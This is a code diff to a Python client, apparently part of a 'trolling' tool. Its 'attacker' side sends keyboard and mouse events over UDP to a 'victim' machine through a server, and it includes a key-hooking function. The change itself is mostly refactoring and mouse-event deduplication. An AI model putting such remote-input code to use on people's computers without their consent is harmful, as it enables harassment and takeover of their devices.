@@ -24,9 +24,17 @@ class TkInterScreen:
         self.menu = None
         self.start_trolling = None
 
+    def reset_values(self):
+        self.root.destroy()
+        self.root = None
+        self.choice = None
+        self.options = None
+        self.menu = None
+        self.start_trolling = None
+
     def on_closing(self) -> None:
         SocketData.s.sendto("attacker exit".encode(), SocketData.ip_of_server)
-        self.root.destroy()
+        self.reset_values()
         SocketData.want_to_leave = True
 
     def send_choice(self) -> None:
@@ -34,12 +42,8 @@ class TkInterScreen:
             SocketData.s.sendto(f"choice{int(self.choice.get()[0]) - 1}".encode(), SocketData.ip_of_server)
             while not SocketData.ip_of_victim:
                 pass
-            self.root.destroy()
-            self.root = None
-            self.choice = None
-            self.options = None
-            self.menu = None
-            self.start_trolling = None
+            self.reset_values()
+
         else:
             messagebox.showerror("No selection error", "Choose First")
 
@@ -85,6 +89,7 @@ class PygameScreen:
         self.is_pygame_screen_in_focus = False
         self.screen = pygame.display.set_mode((400, 400), RESIZABLE)
         while 1:
+            last_sent_mouse_id = 0
             for event in pygame.event.get():
                 match event.type:
                     case pygame.QUIT:
@@ -116,14 +121,17 @@ class PygameScreen:
                         if generated_number not in [0, 9, 25]:
                             pack_and_send(to_pack=generated_number + 16)
                     case pygame.MOUSEMOTION:
-                        pack_and_send(204800 * pygame.mouse.get_pos()[0] // self.screen.get_size()[0] + 1600 *
-                                      pygame.mouse.get_pos()[1] // self.screen.get_size()[1] + 1)
+                        current_mouse_id = 100 * pygame.mouse.get_pos()[1] // self.screen.get_size()[1] * 2048 + 100 * \
+                                           pygame.mouse.get_pos()[0] // self.screen.get_size()[0] * 16 + 1
+                        if current_mouse_id != last_sent_mouse_id:
+                            pack_and_send(current_mouse_id)
+                            last_sent_mouse_id = current_mouse_id
 
 
 def pack_and_send(to_pack: int) -> None:
     if to_pack:
         packed = to_pack.to_bytes(4, 'little')
-        SocketData.s.sendto(__data=packed, __address=SocketData.ip_of_victim)
+        SocketData.s.sendto(packed, SocketData.ip_of_victim)
 
 
 def hook_keys() -> None:
